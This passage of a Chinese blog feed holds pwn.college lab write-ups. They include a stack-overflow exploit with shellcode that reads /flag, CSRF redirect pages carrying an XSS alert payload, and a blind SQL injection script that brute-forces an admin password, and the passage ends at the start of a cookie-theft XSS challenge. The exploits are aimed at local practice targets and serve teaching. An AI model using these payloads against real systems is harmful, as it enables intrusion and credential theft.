src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/ret-breakpoint.png"><br>从图中看到返回地址&#x3D;0x7fffffffd608，因此应该将返回地址覆写为0x7fffffffd610，但是不能这么干，因为这样gdb调试得到的返回地址其实是不准确的，因为gdb会引入一些环境变量导致栈的空间改变<br><br>在实战中，更多采用NOP滑行的方法，即在真正的shellcode之前填入若干个NOP指令，返回地址只要确定一个大概范围，最后能命中这些NOP里的任何一个即可，这里我选择的是0x7fffffffd660，在返回地址后面0x50个字节。<br><br>现在可以编写出如下的exp了<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr=<span class="hljs-number">0x7fffffffd660</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;/challenge/binary-exploitation-hijack-to-shellcode&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">120</span>+p64(returnAddr)+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x200</span>+shellcode<br>p.recvuntil(<span class="hljs-string">&#x27;Send your payload (up to 4096 bytes)!\n&#x27;</span>)<br>p.send(payload)<br>p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="getshell的临门一脚"><a href="#getshell的临门一脚" class="headerlink" title="getshell的临门一脚"></a>getshell的临门一脚</h1><p>很遗憾，上述脚本实测无法打通，这是由于pwn.college的问题，子进程并没有继承root权限，导致读取&#x2F;flag文件时权限错误<br><br>至于为什么出现这种原因，怀疑是pwn.college服务器的sh是指向bash的，由于目标程序是通过SUID获得了root权限，而bash解释器默认会阻止SUID程序的子进程继承权限（不同于zsh等）。所以调用&#x2F;bin&#x2F;sh没有root<br><br>有2种办法解决，一个是在调用&#x2F;bin&#x2F;sh之前进行一次setuid(0)的操作，另一种是改一下shellcode，直接通过系统调用完成输出flag，我这题采用了后者<br><br>最终exp.py如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr=<span class="hljs-number">0x7fffffffd660</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;/challenge/binary-exploitation-hijack-to-shellcode&#x27;</span>)<br>shellcode= asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.intel_syntax noprefix</span><br><span class="hljs-string">mov r10,0x67616c662f2f2f2f</span><br><span class="hljs-string">shr r10,24</span><br><span class="hljs-string">push r10</span><br><span class="hljs-string">lea rdi,[rsp]</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 2</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">sub rsp,100</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">push 100</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=<span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">120</span>+p64(returnAddr)+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x200</span>+shellcode<br>p.recvuntil(<span class="hljs-string">&#x27;Send your payload (up to 4096 bytes)!\n&#x27;</span>)<br>p.send(payload)<br>output = p.recvall()<br><span class="hljs-built_in">print</span>(output.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><p>最后也是成功拿到了flag<br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF-3</title>
    <link href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-3/"/>
    <url>/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-3/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要通过CSRF引起XSS，并且提示我们注意javascript标签的闭合问题</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>查看victim源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    WebDriverWait(browser, <span class="hljs-number">1</span>).until(EC.alert_is_present())<br><span class="hljs-keyword">except</span> TimeoutException:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failure: JavaScript alert did not trigger...&quot;</span>)<br>    sys.exit(<span class="hljs-number">3</span>)<br><span class="hljs-keyword">else</span>:<br>    browser.switch_to.alert.accept()<br>    <span class="hljs-keyword">if</span> browser.current_url.replace(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).startswith(challenge_url.replace(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Alert triggered! Your reward:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;It looks like the alert did not come from &#123;challenge_url&#125;/ephemeral?&quot;</span>)<br></code></pre></td></tr></table></figure><p>发现输出falg的逻辑是访问server的ephemeral路由，并检测是否有alert出现<br><br>回到server端查看该路由，可以看到有一个msg的查询字符串（即GET传参），因此存在admin账户的请求伪造，并触发admin账户执行相应的js代码的漏洞</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>根据上述分析，只要我们可以把victim重定向到challenge.localhost&#x2F;ephemeral并在该页面执行js代码即可<br><br>故可以写出如下的页面：index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF Attack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://challenge.localhost/ephemeral?msg=&lt;s&quot;</span>+<span class="hljs-string">&quot;cript&gt;alert(&#x27;PWNED&#x27;)&lt;\/script&gt;&quot;</span></span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>通过依次启动server、启动自己的服务（1337端口）、启动victim即可获得flag：<br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-3.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF-1</title>
    <link href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-1/"/>
    <url>/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-1/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>XSS注入JavaScript以导致受害者发起HTTP请求。 但是如果没有XSS怎么办？ 答案是直接“注入”HTTP请求。<br></p><span id="more"></span><p>web设计的目的是使许多不同的网站相互连接。 网站可以嵌入来自其他网站的图像，链接到其他网站，甚至重定向到其他网站。 所有这些灵活性意味着一些严重的安全风险，而且几乎没有任何措施可以防止恶意网站直接导致受害者访问者发出潜在的敏感请求，例如（在我们的例子中）将 GET 请求发送给 <a href="http://challenge.localhost/publish">http://challenge.localhost/publish</a> ！<br></p><p>这种类型的跨站点请求伪造被称为跨站请求伪造（Cross Site Request Forgery，简称CSRF）。<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先分析源码，这题其实存在XSS漏洞，但是admin不会访问&#x2F;challenge.localhost，因此没办法通过把js代码写到首页去骗admin重定向到publish路由<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_get</span>():<br>    page = <span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, now XSS-free (for admin, at least)!&lt;hr&gt;\n&quot;</span><br>    username = flask.session.get(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span>:<br>        page += <span class="hljs-string">&quot;&quot;&quot;&lt;b&gt;To prevent XSS, the admin does not view messages!&lt;/b&gt;&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>可以看到存在if username&#x3D;&#x3D;’admin’的额外校验，根据提示应该用CSRF；<br><br>接下来看一下victim源码：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">challenge_url = <span class="hljs-string">&quot;http://challenge.localhost:80/&quot;</span><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read().strip()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Visiting <span class="hljs-subst">&#123;challenge_url&#125;</span>&quot;</span>)<br>browser.get(challenge_url)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Logging in as admin...&quot;</span>)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Visiting the attacker&#x27;s website (http://hacker.localhost:1337/)...&quot;</span>)<br>browser.get(<span class="hljs-string">&quot;http://hacker.localhost:1337/&quot;</span>)<br>time.sleep(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>分析一下，主要分两个部分，第一个是请求challenge.localhost，并且以admin登录，接下来注意到第二部分会访问本地的1337端口；<br><br>因此只要我们在1337开一个web服务，把admin重定向到&#x2F;publish路由就可以了；<br><br>因此存在CSRF漏洞，可以从我们的“钓鱼网站”伪造admin在请求<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>综上，利用思路就是在1337开一个服务，等victim访问我们，然后再以guest身份登录challenge.localhost即可看到flag<br>开启服务有很多方法，题目里就提供了两个，一个最基础的nc，前面几题都用过，不再记录<br><br>另一个是python的http.server模块，个人感觉python的比nc方便，只要写一个简单的index.html就行；<br><br>因此写出如下的index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF Attack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://challenge.localhost/publish&quot;</span></span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>综上，完整流程是：<br><br>首先启动&#x2F;challenge&#x2F;server<br><br>之后cd到保存有index.html的目录中并运行以下命令：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 1337<br></code></pre></td></tr></table></figure><p>之后再运行&#x2F;challenge&#x2F;victim，最后刷新浏览器就可以了，也是成功拿到了flag<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/CSRF-1.png"></p><h2 id="一点基础知识补充"><a href="#一点基础知识补充" class="headerlink" title="一点基础知识补充"></a>一点基础知识补充</h2><p>回看这个Wp，感觉缺了些基础知识的讲解，简单讲一下index.html怎么写出来的<br><br>其实主要是html里的这一句</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://challenge.localhost/publish&quot;</span></span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果是完全零基础，大概率会有疑问window.location.href是个什么东西（记得pwn.college的前面题目都没讲过这个东西），这里浅浅演示一下，深入的还得自己查，直接看下面这两张图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/window-location-href1.png"><br>首先上面第一张图，看到我在浏览器的url里输入了这么个东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javascript:alert(window.location.href)<br></code></pre></td></tr></table></figure><p>拆解一下，alert没什么好说的，alert的参数就是window这一大串，这个url意思就是执行冒号后面的javascript代码，当点击回车的时候，由于当前位于b站的首页，浏览器就会显示b站的域名,如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/window-location-href2.png"><br>这样应该能感受到，window这一串其实可以理解为网页域名，这道题里我们通过对它赋值，起到了重定向的作用<br><br>至于javascript:是什么，其实就是一个伪协议头，可以把它理解为http:&#x2F;&#x2F;这样的东西，搜一下完整的URL组成可以知道这些都是协议头，简单记忆就是不带&#x2F;&#x2F;的就是伪协议，反之就是我们常见的协议头<br><br>伪协议还有很多，像mailto:，这个协议后面跟邮箱，浏览器就会唤起电脑里默认的邮件应用程序，还有tel:，跟个号码，打电话用的<br><br>上述基础知识只是一个简单的补充，以后碰到具体题目再做记录</p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLi-5</title>
    <link href="/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/SQLi-5/"/>
    <url>/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/SQLi-5/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这一题和一般的SQL注入都不同，服务端将不再回显任何SQL查询的结果，但幸好题目提示我们，即便不显示任何数据，我们也可以一个字符一个字符的恢复，这可以通过查询时页面不同的行为来判断，比如认证成功or认证失败</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>看完题面大概猜到是一个盲注，需要自己写脚本了，一个字符一个字符的爆破，然后看一下server端的源代码：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_post</span>():<br>    username = flask.request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    password = flask.request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `username` form parameter&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> password:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `password` form parameter&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># https://www.sqlite.org/lang_select.html</span><br>        query = <span class="hljs-string">f&quot;SELECT rowid, * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="hljs-subst">&#123; password &#125;</span>&#x27;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;DEBUG: <span class="hljs-subst">&#123;query=&#125;</span>&quot;</span>)<br>        user = db.execute(query).fetchone()<br>    <span class="hljs-keyword">except</span> sqlite3.Error <span class="hljs-keyword">as</span> e:<br>        flask.abort(<span class="hljs-number">500</span>, <span class="hljs-string">f&quot;Query: <span class="hljs-subst">&#123;query&#125;</span>\nError: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br><br>    flask.session[<span class="hljs-string">&quot;user&quot;</span>] = username<br>    <span class="hljs-keyword">return</span> flask.redirect(flask.request.path)<br></code></pre></td></tr></table></figure><p>这里可以发现查询语句是直接拼接生成，因此存在SQL注入风险，同时根据查询执行结果的不同，返回状态码403或者重定向，因此这是一个布尔盲注类型</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先确定闭合类型，根据上述源码，可以看到username和password都是字符型，单引号闭合<br><br>由于不需要联合查询，因此这一题里面可以不用判断字段数量<br><br>（其实也很好判断，看源码，rowid加上*，表里面有两列，一共就是3列，如果要联合查询的话就应该是如union select 1,2,3；确保列数一致即可）<br><br>(备注：如果没有源码该怎么判断，此时需要用到二分法试探，以后碰到具体题目再做记录……)</p><p>根据上述分析，可以开始写盲注脚本，主要思路就是首先根据flag的长度（因为每题flag都是一样的长度，很容易确定）作为外层循环，内层循环逐个试探可打印字符；<br><br>判断是否和flag对上的标准就是看返回状态码是否&#x3D;302（即重定向），脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>flag=<span class="hljs-string">r&quot;pwn.college&#123;&quot;</span><br>flagLen=<span class="hljs-number">59</span><br>url=<span class="hljs-string">&quot;http://challenge.localhost:80&quot;</span><br>hostName=&#123;<span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;challenge.localhost:80&quot;</span>&#125;<br>password=<span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-comment">#admin &#x27; and SUBSTR(password,1,1)=&#x27;p&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">13</span>,flagLen+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> charac <span class="hljs-keyword">in</span> string.printable:<br>        username=<span class="hljs-string">&quot;admin&#x27; and SUBSTR(password,&quot;</span>+<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&quot;,1)=&#x27;&quot;</span><br>        username+=charac<br>        username+=<span class="hljs-string">&quot;&#x27; -- &quot;</span><br>        body=&#123;<span class="hljs-string">&quot;username&quot;</span>:username,<span class="hljs-string">&quot;password&quot;</span>:password&#125;<br>        response=requests.post(url,data=body,headers=hostName)<br>        <span class="hljs-keyword">if</span> response.status_code==<span class="hljs-number">200</span>:<br>            flag+=charac<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br></code></pre></td></tr></table></figure><p>这里由于python的requests模块自动跟随重定向了，把判断条件改成状态码&#x3D;&#x3D;200，也可以关掉重定向，一样的<br><br>运行脚本后等待一段时间即可输出flag了<br><img src="/../../../../../../../photos/pwn.college/intro/Web/SQLi-5.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS-7</title>
    <link href="/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/XSS-7/"/>
    <url>/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/XSS-7/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一个攻击者的目标可能是完全接管受害者账户，这需要认证信息，该信息常存储在cookie中，如果能够拿到cookie，就可以绕过服务端的身份认证，这一关将登录用户的信息存储在了cookie中</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先看server端的源码<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> user:<br>        page += <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            &lt;form action=draft method=post&gt;</span><br><span class="hljs-string">              Post:&lt;textarea name=content&gt;Write something!&lt;/textarea&gt;</span><br><span class="hljs-string">              &lt;input type=checkbox name=publish&gt;Publish</span><br><span class="hljs-string">              &lt;input type=submit value=Save&gt;</span><br><span class="hljs-string">            &lt;/form&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;form action=publish method=post&gt;&lt;input type=submit value=&quot;Publish All Drafts&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">            &lt;hr&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>在发布帖子时，直接拼接用户输入，因此存在XSS漏洞。首先考虑能不能跟XSS-5和6一样，重定向admin用户，让它自己把帖子发出来，但是看到&#x2F;publish路由下存在校验：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span>:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;pwnpost no longer supports admin posting due to rampant flag disclosure&quot;</span>)<br></code></pre></td></tr></table></figure><p>因此无法再通过类似前两题的方式泄露flag，根据题目提示需要我们泄露admin的cookie，再看一下设置cookie的逻辑如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_login</span>():<br>    username = flask.request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    password = flask.request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `username` form parameter&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> password:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `password` form parameter&quot;</span>)<br><br>    <span class="hljs-comment"># https://www.sqlite.org/lang_select.html</span><br>    user = db.execute(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, 